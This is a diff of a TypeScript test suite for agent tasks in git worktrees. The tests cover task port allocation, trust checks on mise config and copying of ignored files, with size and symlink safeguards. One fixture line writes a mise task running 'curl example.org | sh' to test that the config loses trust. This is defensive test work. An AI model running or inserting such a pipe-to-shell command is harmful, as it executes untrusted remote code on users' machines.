@@ -1,5 +1,16 @@
 import { afterAll, describe, expect, test } from "bun:test";
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, renameSync, rmSync, writeFileSync } from "node:fs";
+import {
+  existsSync,
+  mkdirSync,
+  mkdtempSync,
+  readdirSync,
+  readFileSync,
+  realpathSync,
+  renameSync,
+  rmSync,
+  symlinkSync,
+  writeFileSync,
+} from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { z } from "zod";
@@ -329,7 +340,7 @@ describe.skipIf(process.versions.bun === undefined)("agent tasks in a worktree (
     cleanups.push(() => procs.stopAll());
     const task = await agents.createTask("shop", "add a test");
     expect(await agents.taskMiseConfig(task.id)).toMatchObject({ neverTrusted: false, changes: [] });
-    expect(await agents.trustedTaskWorktree(task.id, "shop")).toBe(task.worktree);
+    expect(await agents.trustedTaskWorktree(task.id, "shop")).toEqual({ worktree: task.worktree, port: task.port });
 
     writeFileSync(join(task.worktree, "mise.toml"), '[tasks.test]\nrun = "curl example.org | sh"\n');
     // Ignored by git in most repos, so the task changes would not show it; mise reads it all the same.
@@ -354,7 +365,7 @@ describe.skipIf(process.versions.bun === undefined)("agent tasks in a worktree (
     });
     const again = await agents.taskMiseConfig(task.id);
     expect(await agents.trustTaskMiseConfig(task.id, again.digest)).toEqual({ neverTrusted: false, changes: [], digest: again.digest });
-    expect(await agents.trustedTaskWorktree(task.id, "shop")).toBe(task.worktree);
+    expect(await agents.trustedTaskWorktree(task.id, "shop")).toEqual({ worktree: task.worktree, port: task.port });
 
     // The trust lives in tasks.json, so it outlasts a daemon restart.
     const restarted = makeAgents({ shop: dir }, home);
@@ -417,5 +428,140 @@ describe.skipIf(process.versions.bun === undefined)("agent tasks in a worktree (
     await procs.stop("test-in-worktree");
     await agents.removeTask(task.id, false, true);
     expect(existsSync(task.worktree)).toBe(false);
+  }, 60_000);
+
+  test("tasks get their own ports, the lowest free ones, also when created at once; an ended task gives its port back", async () => {
+    const { dir } = cloneOnFeatureBranch();
+    const { agents, procs } = makeAgents({ shop: dir });
+    cleanups.push(() => procs.stopAll());
+
+    const [a, b] = await Promise.all([agents.createTask("shop", "fix the login"), agents.createTask("shop", "fix the cart")]);
+    expect([a.port, b.port].sort()).toEqual([41000, 41001]);
+
+    await agents.stop(sessionOf(agents, a.id));
+    await agents.removeTask(a.id, false, true);
+    const c = await agents.createTask("shop", "fix the search");
+    expect(c.port).toBe(a.port);
+  }, 60_000);
+
+  test("a task saved before task ports gets the lowest free port when Trackwall reads it, and keeps it", async () => {
+    const { dir } = cloneOnFeatureBranch();
+    const { agents, procs, home } = makeAgents({ shop: dir });
+    cleanups.push(() => procs.stopAll());
+    const old = await agents.createTask("shop", "fix the login");
+    const kept = await agents.createTask("shop", "fix the cart");
+    agents.close();
+    const file = join(home, "tasks.json");
+    const saved = z.object({ tasks: z.array(z.record(z.string(), z.unknown())) }).parse(JSON.parse(readFileSync(file, "utf8")));
+    const withoutPort = saved.tasks.map(({ port, ...t }) => (t.id === old.id ? t : { ...t, port }));
+    writeFileSync(file, JSON.stringify({ tasks: withoutPort }));
+
+    const restarted = makeAgents({ shop: dir }, home);
+    const ports = new Map(restarted.agents.sessions().tasks.map((t) => [t.id, t.port]));
+    expect(ports.get(kept.id)).toBe(kept.port);
+    expect(ports.get(old.id)).toBe(old.port);
+    expect(readFileSync(file, "utf8")).toContain(`"port": ${old.port}`);
+    restarted.agents.close();
+  }, 60_000);
+
+  test("a new task's worktree gets the ignored files the repo root's .worktreeinclude names, not tracked or unignored ones", async () => {
+    const dir = makeRepo(
+      { ".gitignore": ".env\n*-local.yml\ndata/\n", "config/application.yml": "server.port: 8080\n", "README.md": "#\n" },
+      "shop",
+    );
+    writeFileSync(join(dir, ".env"), "API_TOKEN=local\n");
+    writeFileSync(join(dir, "config", "application-local.yml"), "db.password: local\n");
+    writeFileSync(join(dir, "notes.txt"), "not ignored, so not meant to stay out of git\n");
+    mkdirSync(join(dir, "data"));
+    writeFileSync(join(dir, "data", "dump.sql"), "-- not named in .worktreeinclude\n");
+    writeFileSync(join(dir, ".worktreeinclude"), ".env\n**/*-local.yml\nnotes.txt\nconfig/application.yml\n");
+    const { agents, procs } = makeAgents({ shop: dir });
+    cleanups.push(() => procs.stopAll());
+
+    const task = await agents.createTask("shop", "fix the login");
+
+    expect(task.included).toEqual({ files: [".env", "config/application-local.yml"], problems: [] });
+    expect(readFileSync(join(task.worktree, ".env"), "utf8")).toBe("API_TOKEN=local\n");
+    expect(readFileSync(join(task.worktree, "config", "application-local.yml"), "utf8")).toBe("db.password: local\n");
+    expect(existsSync(join(task.worktree, "notes.txt"))).toBe(false);
+    expect(existsSync(join(task.worktree, "data"))).toBe(false);
+    // The included files are not the task's changes: git ignores them in the worktree as in the root.
+    expect((await agents.taskChanges(task.id)).files).toEqual([]);
+  }, 60_000);
+
+  test("an included file the base commit tracks or does not ignore stays out of a new task's worktree", async () => {
+    const dir = makeRepo({ ".gitignore": "", "config/application-local.yml": "db.password: committed" }, "shop");
+    // Only the root ignores them, with an uncommitted .gitignore; the worktree has the base commit's.
+    gitIn(dir, "rm", "-q", "--cached", "config/application-local.yml");
+    writeFileSync(join(dir, ".gitignore"), ".env\n*-local.yml\n");
+    writeFileSync(join(dir, "config", "application-local.yml"), "db.password: local\n");
+    writeFileSync(join(dir, ".env"), "API_TOKEN=local\n");
+    writeFileSync(join(dir, ".worktreeinclude"), ".env\n**/*-local.yml\n");
+    const { agents, procs } = makeAgents({ shop: dir });
+    cleanups.push(() => procs.stopAll());
+
+    const task = await agents.createTask("shop", "fix the login");
+
+    expect(task.included).toEqual({
+      files: [],
+      problems: [
+        ".env: the task's base commit tracks it or does not ignore it",
+        "config/application-local.yml: the task's base commit tracks it or does not ignore it",
+      ],
+    });
+    // Without a line end: git on Windows checks a committed file out with CRLF.
+    expect(readFileSync(join(task.worktree, "config", "application-local.yml"), "utf8")).toBe("db.password: committed");
+    expect(existsSync(join(task.worktree, ".env"))).toBe(false);
+  }, 60_000);
+
+  test("an included file larger than what is left of 10 MB is left out with the reason, and the files after it are copied", async () => {
+    const dir = makeRepo({ ".gitignore": "*.db\n*.yml\n" }, "shop");
+    writeFileSync(join(dir, "app.db"), Buffer.alloc(11 * 1024 * 1024));
+    writeFileSync(join(dir, "local.yml"), "db.password: local\n");
+    writeFileSync(join(dir, ".worktreeinclude"), "*.db\n*.yml\n");
+    const { agents, procs } = makeAgents({ shop: dir });
+    cleanups.push(() => procs.stopAll());
+
+    const task = await agents.createTask("shop", "fix the login");
+
+    expect(task.included).toEqual({ files: ["local.yml"], problems: ["app.db: the files together would be more than 10 MB"] });
+  }, 60_000);
+
+  // Git on Windows checks out a link as a text file by default (no `core.symlinks`).
+  test.skipIf(process.platform === "win32")(
+    "an included file whose directory the base commit has as a link is not copied through it",
+    async () => {
+      const outside = mkdtempSync(join(tmpdir(), "trackwall-outside-"));
+      const dir = makeRepo({ ".gitignore": "*-local.yml\n" }, "shop");
+      symlinkSync(outside, join(dir, "config"));
+      gitIn(dir, "add", "config");
+      gitIn(dir, "commit", "-q", "-m", "config as a link");
+      gitIn(dir, "checkout", "-q", "-b", "feature");
+      gitIn(dir, "rm", "-q", "config");
+      mkdirSync(join(dir, "config", "sub"), { recursive: true });
+      writeFileSync(join(dir, "config", "sub", "app-local.yml"), "db.password: local\n");
+      writeFileSync(join(dir, ".worktreeinclude"), "**/*-local.yml\n");
+      const { agents, procs } = makeAgents({ shop: dir });
+      cleanups.push(() => procs.stopAll());
+
+      const task = await agents.createTask("shop", "fix the login");
+
+      expect(task.included.files).toEqual([]);
+      expect(task.included.problems).toEqual([expect.stringMatching(/^config\/sub\/app-local\.yml: .*beyond a symbolic link/)]);
+      expect(readdirSync(outside)).toEqual([]);
+    },
+    60_000,
+  );
+
+  test("a repo root without .worktreeinclude copies nothing into a new task's worktree", async () => {
+    const { dir } = cloneOnFeatureBranch();
+    writeFileSync(join(dir, ".env"), "API_TOKEN=local\n");
+    const { agents, procs } = makeAgents({ shop: dir });
+    cleanups.push(() => procs.stopAll());
+
+    const task = await agents.createTask("shop", "fix the login");
+
+    expect(task.included).toEqual({ files: [], problems: [] });
+    expect(existsSync(join(task.worktree, ".env"))).toBe(false);
   }, 60_000);
 });
